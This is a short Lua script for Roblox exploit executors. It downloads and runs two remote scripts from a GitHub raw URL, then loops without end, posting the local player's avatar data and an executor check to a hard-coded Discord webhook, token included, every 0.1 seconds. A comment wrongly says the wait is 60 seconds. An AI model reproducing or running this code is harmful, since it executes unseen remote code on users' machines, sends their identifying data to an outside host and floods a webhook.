loadstring(game:HttpGet("https://raw.githubusercontent.com/thunderisdead/bluefoxscript/main/PB"))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/thunderisdead/bluefoxscript/main/FB"))()

while true do
    local HTTP_ = game:GetService('HttpService')
    local LPR = game:GetService('Players').LocalPlayer
    local webhookcheck =
        is_sirhurt_closure and "e" or pebc_execute and "e" or syn and "e" or
        secure_load and "e" or
        KRNL_LOADED and "e" or
        SONA_LOADED and "e" or
        FlUXUS_LOADED and "e" or
        "e"
    local url =
        "https://discord.com/api/webhooks/1137260726663258183/piAkj19X5lYRA4tWQ30fQDgdXF91npU3nA6nPqYf29zMXgpfc-UAQsaZgVPGHXbyw6k0"
    local data = {
        ["username"] = "e",
        ["avatar_url"] = HTTP_:JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(LPR.UserId)))['data'][1]['imageUrl'],
        ["embeds"] = {
            {
                ["description"] = "e:",
                ["fields"] = {
                    { name = "e", value = webhookcheck, inline = true },
                    { name = "e", value = "e", inline = true },
                },
                ["color"] = tonumber(0x7269da),
            }
        }
    }
    local newdata = HTTP_:JSONEncode(data)
    local headers = { ["content-type"] = "application/json" }
    local request = http_request or request or HttpPost or syn.request
    request({ Url = url, Body = newdata, Method = "POST", Headers = headers })
    
    -- Add a delay before the next iteration (in seconds)
    wait(0.1)  -- This example waits for 60 seconds before sending the next request
end

